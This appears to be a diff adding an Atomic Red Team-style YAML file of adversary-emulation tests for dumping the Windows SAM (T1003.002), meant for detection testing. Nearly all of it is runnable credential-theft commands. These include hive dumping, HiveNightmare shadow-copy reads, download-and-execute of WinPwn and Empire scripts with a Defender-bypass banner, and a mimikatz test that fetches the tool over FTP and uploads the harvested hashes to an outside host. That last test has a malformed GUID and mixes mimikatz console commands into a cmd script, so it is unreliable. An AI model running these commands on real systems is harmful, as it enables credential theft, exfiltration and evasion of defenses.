@@ -1,0 +1,253 @@
+atomic_tests:
+- auto_generated_guid: 5c2571d0-1572-416d-9676-812e64ca9f44
+  description: 'Local SAM (SAM & System), cached credentials (System & Security) and
+    LSA secrets (System & Security) can be enumerated
+
+    via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
+
+
+    Upon successful execution of this test, you will find three files named, sam,
+    system and security in the %temp% directory.
+
+    '
+  executor:
+    cleanup_command: 'del %temp%\sam >nul 2> nul
+
+      del %temp%\system >nul 2> nul
+
+      del %temp%\security >nul 2> nul
+
+      '
+    command: 'reg save HKLM\sam %temp%\sam
+
+      reg save HKLM\system %temp%\system
+
+      reg save HKLM\security %temp%\security
+
+      '
+    elevation_required: true
+    name: command_prompt
+  name: Registry dump of SAM, creds, and secrets
+  supported_platforms:
+  - windows
+- auto_generated_guid: a96872b2-cbf3-46cf-8eb4-27e8c0e85263
+  dependencies:
+  - description: 'Computer must have python 3 installed
+
+      '
+    get_prereq_command: 'echo "Python 3 must be installed manually"
+
+      '
+    prereq_command: 'py -3 --version >nul 2>&1
+
+      exit /b %errorlevel%
+
+      '
+  - description: 'Computer must have pip installed
+
+      '
+    get_prereq_command: 'echo "PIP must be installed manually"
+
+      '
+    prereq_command: 'py -3 -m pip --version >nul 2>&1
+
+      exit /b %errorlevel%
+
+      '
+  - description: 'pypykatz must be installed and part of PATH
+
+      '
+    get_prereq_command: 'pip install pypykatz
+
+      '
+    prereq_command: 'pypykatz -h >nul 2>&1
+
+      exit /b %errorlevel%
+
+      '
+  dependency_executor_name: command_prompt
+  description: 'Parses registry hives to obtain stored credentials
+
+    '
+  executor:
+    command: 'pypykatz live registry
+
+      '
+    elevation_required: true
+    name: command_prompt
+  name: Registry parse with pypykatz
+  supported_platforms:
+  - windows
+- auto_generated_guid: a90c2f4d-6726-444e-99d2-a00cd7c20480
+  description: 'Copy the SAM hive using the esentutl.exe utility
+
+    This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.
+
+    '
+  executor:
+    cleanup_command: 'del #{copy_dest}\#{file_name} >nul 2>&1
+
+      '
+    command: 'esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
+
+      '
+    elevation_required: true
+    name: command_prompt
+  input_arguments:
+    copy_dest:
+      default: '%temp%'
+      description: Destination of the copied file
+      type: string
+    file_name:
+      default: SAM
+      description: Name of the copied file
+      type: string
+    file_path:
+      default: '%SystemRoot%/system32/config/SAM'
+      description: Path to the file to copy
+      type: path
+  name: esentutl.exe SAM copy
+  supported_platforms:
+  - windows
+- auto_generated_guid: 804f28fc-68fc-40da-b5a2-e9d0bce5c193
+  dependencies:
+  - description: PowerDump script must exist on disk at specified location
+    get_prereq_command: Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1"
+      -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
+    prereq_command: 'if (Test-Path "$Env:Temp\PowerDump.ps1") {exit 0} else {exit
+      1} '
+  description: Executes a hashdump by reading the hashes from the registry.
+  executor:
+    command: 'Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON"
+      -fore green
+
+      Import-Module "$Env:Temp\PowerDump.ps1"
+
+      Invoke-PowerDump'
+    elevation_required: true
+    name: powershell
+  name: PowerDump Hashes and Usernames from Registry
+  supported_platforms:
+  - windows
+- auto_generated_guid: eeb9751a-d598-42d3-b11c-c122d9c3f6c7
+  description: 'Dump hives from volume shadow copies with the certutil utility, exploiting
+    a vulnerability known as "HiveNightmare" or "SeriousSAM".
+
+    This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
+
+    '
+  executor:
+    cleanup_command: 'for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a
+      >nul 2>&1)
+
+      '
+    command: 'for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}"
+      %temp%\#{target_hive}vss%a 2 >nul 2>&1) && dir /B %temp%\#{target_hive}vss%a
+
+      '
+    elevation_required: false
+    name: command_prompt
+  input_arguments:
+    limit:
+      default: 10
+      description: Limit to the number of shadow copies to iterate through when trying
+        to copy the hive
+      type: integer
+    target_hive:
+      default: SAM
+      description: Hive you wish to dump
+      type: string
+  name: dump volume shadow copy hives with certutil
+  supported_platforms:
+  - windows
+- auto_generated_guid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
+  description: 'Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
+
+    '
+  executor:
+    cleanup_command: "1..#{limit} | % {\n  rm \"$env:TEMP\\#{target_hive}vss$_\" -ErrorAction\
+      \ Ignore\n}\n"
+    command: "1..#{limit} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\\
+      Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\#{target_hive}\"\
+      \ , \"$env:TEMP\\#{target_hive}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\\
+      #{target_hive}vss$_\" -ErrorAction Ignore\n}\n"
+    elevation_required: false
+    name: powershell
+  input_arguments:
+    limit:
+      default: 10
+      description: Limit to the number of shadow copies to iterate through when trying
+        to copy the hive
+      type: integer
+    target_hive:
+      default: SAM
+      description: Hive you wish to dump
+      type: string
+  name: dump volume shadow copy hives with System.IO.File
+  supported_platforms:
+  - windows
+- auto_generated_guid: 0c0f5f06-166a-4f4d-bb4a-719df9a01dbb
+  description: Loot local Credentials - Dump SAM-File for NTLM Hashes technique via
+    function of WinPwn
+  executor:
+    command: '$S3cur3Th1sSh1t_repo=''https://raw.githubusercontent.com/S3cur3Th1sSh1t''
+
+      iex(new-object net.webclient).downloadstring(''https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'')
+
+      samfile -consoleoutput -noninteractive  '
+    name: powershell
+  name: WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes
+  supported_platforms:
+  - windows
+- auto_generated_guid: 5h5h9696-0000-4848-f666-123456789000
+  description: Dump SAM-File for NTLM Hashes technique via Mimitatz
+  executor:
+    command: 'echo user user1 anis > #{working_directory}\command.txt
+
+      echo get mimikatz/x64/mimikatz.exe #{working_directory}\mimikatz.exe >> #{working_directory}\command.txt
+
+      echo bye >> #{working_directory}\command.txt
+
+      ftp -n -s:#{working_directory}\command.txt 192.168.80.138
+
+      #{working_directory}\mimikatz.exe
+
+      log #{working_directory}\hash.txt
+
+      privilege::debug
+
+      token::elevate
+
+      lsadump::sam
+
+      exit
+
+      echo user user1 anis > #{working_directory}\command1.txt
+
+      echo put #{working_directory}\hash.txt hash.txt >> #{working_directory}\command1.txt
+
+      echo bye >> #{working_directory}\command1.txt
+
+      ftp -n -s:#{working_directory}\command1.txt 192.168.80.138
+
+      del #{working_directory}\mimikatz.exe
+
+      del #{working_directory}\command.txt
+
+      del #{working_directory}\command1.txt
+
+      del #{working_directory}\hash.txt
+
+      '
+    elevation_required: true
+    name: command_prompt
+  input_arguments:
+    working_directory:
+      default: C:\Users\user1\AppData\Local\Temp
+      description: the directory that receives inputs and outputs
+      type: path
+  name: Dump-SAM-With-Mimikatz
+  supported_platforms:
+  - windows
+attack_technique: T1003.002
+display_name: 'OS Credential Dumping: Security Account Manager'
